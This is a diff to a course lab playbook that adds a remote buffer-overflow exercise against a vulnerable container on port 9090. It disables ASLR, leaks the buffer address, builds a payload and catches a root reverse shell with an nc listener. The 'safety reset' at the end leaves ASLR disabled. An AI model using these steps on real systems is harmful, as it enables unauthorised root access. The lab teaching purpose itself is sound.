@@ -1,4 +1,4 @@
-# CEG4799/CSI4539 Lab 2 - Track 1 Demo Playbook (E1/T1 -> E5/T5)
+# CEG4799/CSI4539 Lab 2 - Track 1 Demo Playbook (E1/T1 -> E5/T5 + E9/T8)
 # Working directory for all commands unless stated otherwise:
 cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
 
@@ -217,6 +217,67 @@ printf '/usr/bin/id\nexit\n' | ./retlib
 #   printf '/usr/bin/id\nexit\n' | ./retlib2
 
 
+# -------------------------------------------
+# E9/T8 - Remote Exploitation (Server Version)
+# -------------------------------------------
+# Position for E9/T8 commands:
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server
+
+# Why: L1 remote server binary is 32-bit static by requirement, and
+# stack-L1 is the target behind TCP port 9090.
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server/server-code
+make clean
+make
+make install
+file stack-L1
+
+# Why: exploit reliability. With ASLR disabled on host, container stack
+# addresses are stable for each server instance. The server still randomizes
+# environment length once at startup, so we calibrate after each restart.
+sudo sysctl -w kernel.randomize_va_space=0
+sysctl kernel.randomize_va_space
+
+# Build/start containers. Use docker-compose in this VM.
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server
+docker-compose build
+docker-compose up -d
+docker-compose ps
+
+# Probe one request so stack-L1 prints its runtime buffer address in logs.
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*8)' | nc -w 1 10.9.0.5 9090 || true
+docker logs --tail 20 server-1-10.9.0.5
+
+# In the log, read:
+#   Buffer's address inside bof(): 0xXXXXXXXX
+# Set ret = buffer + 0xc8 (decimal 200), because exploit.py places
+# shellcode at payload offset start=200.
+# Example from this VM run:
+#   buffer = 0xffffd168  => ret = 0xffffd230
+
+# Generate payload on client side (attack-code) using calibrated ret.
+# Why reverse shell: server redirects only STDIN from port 9090; the payload
+# must actively connect back so we can get an interactive remote shell.
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server/attack-code
+python3 exploit.py 0xffffd230
+
+# Terminal A (attacker listener):
+nc -lvnp 7070
+
+# Terminal B (trigger overflow over TCP 9090):
+cat badfile | nc -w 1 10.9.0.5 9090
+
+# In Terminal A expected proof for T8:
+#   Connection received on 10.9.0.5 ...
+#   root@<container>:/bof# id
+#   uid=0(root) gid=0(root) groups=0(root)
+
+# Capture container-side trace for E9 evidence.
+docker logs --tail 60 server-1-10.9.0.5
+
+# If ret misses after container restart, re-run probe and regenerate payload
+# with the new ret (buffer + 0xc8), then trigger again.
+
+
 # ---------------------------
 # End-of-demo safety reset
 # ---------------------------
@@ -225,3 +286,7 @@ sudo ln -sf /bin/zsh /bin/sh
 sudo sysctl -w kernel.randomize_va_space=0
 readlink -f /bin/sh
 sysctl kernel.randomize_va_space
+
+# Optional cleanup of remote lab containers after demo:
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server
+docker-compose down
